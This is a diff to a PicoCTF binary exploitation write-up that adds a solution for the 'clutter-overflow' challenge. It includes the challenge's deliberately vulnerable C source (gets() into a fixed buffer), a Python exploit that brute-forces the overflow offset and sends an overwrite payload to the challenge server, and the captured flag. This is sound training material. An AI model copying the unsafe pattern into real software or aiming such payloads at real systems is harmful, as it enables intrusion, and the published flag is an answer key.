@@ -1,4 +1,4 @@
-# [PicoCTF](./picoctf.md) Binary Exploitation [1/22]
+# [PicoCTF](./picoctf.md) Binary Exploitation [2/22]
 
 Binary exploitation is the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker.
 
@@ -9,7 +9,7 @@ Binary exploitation is the process of subverting a compiled application such tha
 - [zero_to_hero (2019)](#zero-to-hero)
 - [Guessing Game 1 (2020)](#guessing-game-1)
 - [Guessing Game 2 (2020)](#guessing-game-2)
-- [Stonks (2021)](#stonks)
+- [Stonks (2021)](#stonks) 🗸
 - [Cache Me Outside (2021)](#cache-me-outside)
 - [Here's a LIBC (2021)](#heres-a-libc)
 - [Unsubscriptions Are Free (2021)](#unsubscriptions-are-free)
@@ -20,7 +20,7 @@ Binary exploitation is the process of subverting a compiled application such tha
 - [The Office (2021)](#the-office)
 - [Turboflan (2021)](#turboflan)
 - [Bizz Fuzz (2021)](#bizz-fuzz)
-- [cutter-overflow (2021)](#cutter-overflow)
+- [cutter-overflow (2021)](#cutter-overflow) 🗸
 - [fermat-strings (2021)](#fermat-strings)
 - [SaaS (2021)](#saas)
 - [homework (2021)](#homework)
@@ -1132,8 +1132,119 @@ None.
 
 <summary markdown="span">Solution 1</summary>
 
-solution details
+The source code is provided and the exploit can be clearly seen where the stdin to CLUTTER can be written to exceed the defined buffer 256 bytes:
 
+~~~c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define SIZE 0x100
+#define GOAL 0xdeadbeef
+
+const char* HEADER = 
+" ______________________________________________________________________\n"
+"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
+"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
+"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
+"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
+"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
+"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
+"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
+"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
+"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
+".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
+"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
+"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
+"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
+"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
+"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
+"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";
+
+int main(void)
+{
+  long code = 0;
+  char clutter[SIZE];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+ 	
+  puts(HEADER); 
+  puts("My room is so cluttered...");
+  puts("What do you see?");
+
+  gets(clutter);
+
+
+  if (code == GOAL) {
+    printf("code == 0x%llx: how did that happen??\n", GOAL);
+    puts("take a flag for your troubles");
+    system("cat flag.txt");
+  } else {
+    printf("code == 0x%llx\n", code);
+    printf("code != 0x%llx :(\n", GOAL);
+  }
+
+  return 0;
+}
+~~~
+
+We can use Python to brute-force the buffer required and submit a request to the challenge server:
+	
+~~~py
+import subprocess as sp
+import socket
+import time
+
+exe = ("./chall")
+
+str0 = "a"*256
+str2 = "cccccccccccccccc"
+
+i = 0
+while True:
+    payload = str0 + "b"*i + str2
+    result = sp.run([exe, "import sys; print(sys.stdin.read())"], input=payload, capture_output=True, text=True)
+    output = result.stdout.split("code")
+    code = output[1].split("\n")[0].split(" ")[-1]
+    if "62" in code:
+        buffer = i-1+256
+        print("buffer found; b = {}".format(buffer))
+        break
+    i += 1
+
+str0 = b"a"*buffer
+str1 = b"\xef\xbe\xad\xde"
+payload = str0 + str1 + b"\n"
+
+URL = "mars.picoctf.net"
+PORT = 31890
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((URL, PORT))
+print("connected to challenge server")
+time.sleep(1)
+recvbuff = s.recv(1000)
+s.send(payload)
+time.sleep(1)
+recvbuff = s.recv(1000).decode()
+s.close()
+recvbuff = recvbuff.split("\n")
+print("Flag = ")
+print("\n".join(s for s in recvbuff if "pico" in s))
+~~~
+
+This provides the output:
+
+~~~
+buffer found; b = 264
+connected to challenge server
+Flag = 
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+~~~
+	
 </details>
 
 ### Answer
@@ -1143,7 +1254,7 @@ solution details
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
 ~~~
 
 </details>
